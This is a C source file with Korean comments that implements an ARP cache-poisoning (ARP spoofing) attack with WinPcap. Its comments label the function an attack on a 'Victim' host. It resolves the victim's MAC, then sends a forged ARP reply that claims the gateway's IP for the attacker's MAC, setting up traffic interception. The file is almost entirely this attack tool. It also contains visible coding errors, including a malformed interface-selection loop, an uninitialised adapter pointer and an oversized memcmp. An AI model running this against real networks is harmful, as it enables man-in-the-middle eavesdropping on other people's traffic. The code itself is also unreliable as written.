#define _WINSOCKAPI_    // IPHlpAPi와 Winsock을 쓰기 위해 넣었습니다. 
#include <windows.h>	// 안넣으면 에러가 발생합니다.

#include <IPHlpApi.h>	// GetAdaptersInfo를 통해 어댑터 정보를 얻어옵니다.
#pragma comment(lib, "iphlpapi.lib")

#include <stdlib.h>
#include <stdio.h>

#define HAVE_REMOTE
#include <pcap\pcap.h>

//이더넷 헤더 입니다.
typedef struct {
	u_char dmac[6]; // 6
	u_char smac[6]; // 12
	u_short etype; //  14
}ETHER_HDR;

//ARP 헤더 입니다.
typedef struct {
	u_short hard_type; // 16
	u_short prot_type; // 18
	u_char hard_len;   // 19
	u_char prot_len;	//20
	u_short op;			//22
	u_char smac[6];		//28
	u_char sip[4];		//32
	u_char dmac[6];		//38
	u_char dip[4];		//42
}ARP_HDR;

//공격하는 함수입니다.
//pcap_t 인자 하나와 Victim PC의 ip를 인자로 받습니다.
int arp_atk(pcap_t *fp, char * ip) {
	u_char packet[256]; // 보낼 패킷을 크기 256에 u_char형으로 선언해줍니다. 

	DWORD size = sizeof(PIP_ADAPTER_INFO); // 어댑터 정보의 크기입니다.
	
	//pcap_next_ex를 통해 패킷을 받아들여 저장할 변수입니다.
	struct pcap_pkthdr *header;
	const u_char *pkt_data;

	//전송에 쓰일 이더넷 헤더와 ARP 헤더 구조체입니다.
	ETHER_HDR eth;
	ARP_HDR arp;

	//수신에 쓰일 이더넷 헤더와 ARP 헤더 구조체 포인터입니다.
	ETHER_HDR *reth;
	ARP_HDR *rarp;

	int res; // pcap_next_ex의 결과를 저장할 변수입니다.
	u_char myIP[4], gwIP[4], vIP[4]; // Attacker의 IP와 게이트웨이의 IP 그리고 Victim의 IP를 저장할 변수입니다.

	//vIP에 Victim의 IP를 저장합니다.
	for (int i = 0; i < 4; i++)
		vIP[i] = inet_addr(ip) >> (8 * i) & 0xff;

	//info->Address에 Attacker의 MAC 주소를 저장합니다.
	PIP_ADAPTER_INFO info;
	ZeroMemory(&info, size);
	int result = GetAdaptersInfo(info, &size);
	if (result == ERROR_BUFFER_OVERFLOW) {
		info = (PIP_ADAPTER_INFO)malloc(size);
		if (!info) return 0;
		GetAdaptersInfo(info, &size);
	}

	for (int i = 0; i < 4; i++) // myIP에 Attacker의 IP를 저장합니다.
		myIP[i] = inet_addr(info->IpAddressList.IpAddress.String) >> (8 * i) & 0xff;

	for (int i = 0; i < 4; i++) // gwIP에 게이트웨이의 IP를 저장합니다.
		gwIP[i] = inet_addr(info->GatewayList.IpAddress.String) >> (8 * i) & 0xff;

	//packet을 일단 0으로 초기화 합니다.
	memset(packet, 0, sizeof(packet));

	//이더넷 헤더를 초기화 해줍니다.
	memcpy(eth.smac, info->Address,6); // SMAC은 Attacker의 MAC
	memset(eth.dmac, 0xff, 6);		   // DMAC은 브로드캐스트
	eth.etype = htons(0x806);		   // 이더넷 타입은 ARP

	memcpy(packet, &eth, sizeof(eth)); // packet에 이더넷 헤더를 복사합니다. 

	//ARP 헤더를 초기화 해줍니다.
	arp.hard_type = htons(0x1);		// 하드웨어 타입은 이더넷
	arp.hard_len = 6;				
	arp.prot_len = 4;
	arp.prot_type = htons(0x0800);	// 프로토콜 타입은 IP
	arp.op = htons(1);			// operation code는 REQUEST 모드
	memcpy(arp.sip, myIP, 4);	// ARP_SIP는 Attacker의 IP
	memcpy(arp.dip, vIP, 4);	// ARP_DIP는 Victim의 IP
	memcpy(arp.smac, info->Address, 6); // ARP_SMAC은 Attacker의 MAC
 	memset(arp.dmac, 0, 6); // ARP_DMAC은 브로드 캐스트로 설정합니다.

	memcpy(packet + sizeof(eth), &arp, sizeof(arp)); // packet의 이더넷 헤더 다음에 ARP 헤더를
													 // 덧붙입니다.
	if (pcap_sendpacket(fp, packet, 60) != 0) { // 패킷을 길이 60만큼 보냅니다.
		return -1; // 만약 전송에 문제가 생겼으면 -1을 반환합니다.
	}

	//rarp->smac에 Victim의 MAC을 저장합니다.
	while ((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0) { // ARP Request를 보내고 계속 패킷을 읽습니다.
		reth = (ETHER_HDR*)pkt_data; // reth와 rarp는 수신한 패킷의 이더넷헤더와 ARP헤더를 의미합니다.
		rarp = (ARP_HDR*)((u_char*)reth + sizeof(*reth));
		//수신한 패킷이 ARP이고 opcode는 Reply이며 Request때의 DMAC과 수신한 패킷의 SMAC이 같다면 이전 요청의
		//Reply임을 확신하고 break로 while문을 빠져나옵니다.
		if (ntohs(reth->etype) == 0x806 && ntohs(rarp->op) == 2 && memcmp(rarp->dmac, arp.smac, 4 * 4) == 0)
			break;
	}

	//이더넷 헤더와 ARP 헤더를 조금 수정합니다.
	memcpy(eth.dmac, rarp->smac, 6); // DMAC은 Victim의 MAC
	memcpy(arp.dmac, rarp->smac, 6); // ARP_DMAC은 Victim의 MAC
	memcpy(arp.sip, gwIP, 4); // SIP는 게이트웨이의 IP
	arp.op = htons(2); // operation code는 REPLY로 설정합니다.

	//수정된 이더넷 헤더와 ARP헤더로 패킷을 재생성합니다.
	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	//그리고 다시 패킷을 보냅니다.
	if (pcap_sendpacket(fp, packet, 60) != 0) {
		return -1; // 만약 전송에 문제가 생겼으면 -1을 반환합니다.
	}
}

int main() {

	pcap_if_t *alldevs;
	pcap_if_t *d;
	pcap_t *fp;
	char errbuf[PCAP_ERRBUF_SIZE];

	int inum;
	int i = 0;
	char ip[32];

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) {
		fprintf(stderr, "Error in pcap_findalldevs_ex");
		exit(1);
	}

	for (d = alldevs; d; d = d->next) {
		printf("%d, %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available");
	}

	if (i == 0) {
		printf("\nNo interface found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i) {
		printf("\nInterface number out of range\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	for (d = alldevs; i = 0; i < inum - 1, d = d->next);

	if ((fp = pcap_open_live(d->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf)) == NULL) {
		fprintf(stderr, "\nUnable to open the adapter\n");
		return -1;
	}

	IP_ADAPTER_INFO *info = NULL;
	DWORD size = 0;

	printf("dip : ");
	scanf_s("%s", ip, sizeof(ip));

	arp_atk(fp, ip);


	return 0;
}